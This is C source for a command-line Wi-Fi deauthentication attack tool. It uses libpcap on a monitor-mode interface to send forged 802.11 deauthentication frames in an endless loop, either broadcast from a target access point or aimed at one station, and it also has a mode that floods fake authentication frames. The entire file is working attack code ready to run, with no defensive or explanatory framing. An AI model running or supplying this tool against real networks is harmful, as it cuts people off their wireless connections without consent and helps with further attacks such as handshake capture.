#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include "deauth_packet.cpp"

void usage() {
	printf("syntax: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

typedef struct {
	char* dev_;
	char* ap_mac_;
	char* station_mac_;
	char* auth_;
} Param;

Param param = {
	.station_mac_ = "ff:ff:ff:ff:ff:ff"
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	param->ap_mac_ = argv[2];
	if(argv[3] != NULL){ 
		param->station_mac_ = argv[3];
	}
	if(argv[4] != NULL){
		param->auth_ = argv[4];
	}
	return true;
}

int main(int argc, char* argv[]) {
	char errbuf[PCAP_ERRBUF_SIZE];
	if (!parse(&param, argc, argv))
		return -1;
	if(strlen(param.dev_) > 30){
		printf("Too long interface...\n");
		return -1;
	}
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    	if (pcap == NULL) {
        	fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        	return -1;
    	}
	uint8_t tmp[6];
	uint8_t tmp2[6];
	if(argc == 5){
	//all
		struct radio_frame_add_auth rf;
		sscanf(param.ap_mac_,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5]);
		sscanf(param.station_mac_,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&tmp2[0],&tmp2[1],&tmp2[2],&tmp2[3],&tmp2[4],&tmp2[5]);
		for(int i = 0;i<6;i++){
                                rf.rb.destination_address[i] = tmp[i];
                                rf.rb.source_address[i] = tmp2[i];
                                rf.rb.bssid_address[i] = tmp[i];
                }
		rf.rh.subtype=0xb0;
                rf.rb.reason_code=0x0;
		while(1){
                	if (pcap_sendpacket(pcap, (unsigned char*)&rf, sizeof(rf)) != 0){
                        	printf("Fail sendpacket\n");
                                exit (-1);
                        }
                        printf("Sending fakeauth from [%s] -- BSSID: [%s]\n",param.station_mac_,param.ap_mac_);
                        usleep(100);
                }
	}else{
		if(argc == 3){
		//no station and -auth
			struct radio_frame rf;
			sscanf(param.ap_mac_,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5]);
			for(int i = 0;i<6;i++) {
				rf.rb.destination_address[i] = 0xff;
				rf.rb.source_address[i] = tmp[i];
				rf.rb.bssid_address[i] = tmp[i];
			}
			while(1){
				if (pcap_sendpacket(pcap, (unsigned char*)&rf, sizeof(rf)) != 0){
            				printf("Fail sendpacket\n");
            				exit (-1);
        			}
				printf("Sending Deauth to broadcast -- BSSID: [%s]\n",param.ap_mac_);
				usleep(100);
			}
		}else if(argc == 4){
		//station input
			struct radio_frame rf1;
			struct radio_frame rf2;
			sscanf(param.ap_mac_,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5]);
                	sscanf(param.station_mac_,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&tmp2[0],&tmp2[1],&tmp2[2],&tmp2[3],&tmp2[4],&tmp2[5]);
			for(int i = 0;i<6;i++){
				rf1.rb.destination_address[i] = tmp2[i];
				rf1.rb.source_address[i] = tmp[i];
				rf1.rb.bssid_address[i] = tmp[i];
				rf2.rb.destination_address[i] = tmp[i];
				rf2.rb.source_address[i] = tmp2[i];
				rf2.rb.bssid_address[i] = tmp[i];
			}
			while(1){
                                if (pcap_sendpacket(pcap, (unsigned char*)&rf1, sizeof(rf1)) != 0){
                                        printf("Fail sendpacket\n");
                                        exit (-1);
                                }
				usleep(100);
				if (pcap_sendpacket(pcap, (unsigned char*)&rf2, sizeof(rf2)) != 0){
                                        printf("Fail sendpacket\n");
                                        exit (-1);
                                }
                                printf("Sending Deauth to [%s] -- BSSID: [%s]\n",param.station_mac_,param.ap_mac_);
                                usleep(100);
                        }
		}else{
			printf("it's not good!\n");
			exit(0);
		}
	}		
	pcap_close(pcap);	
	return 0;
}
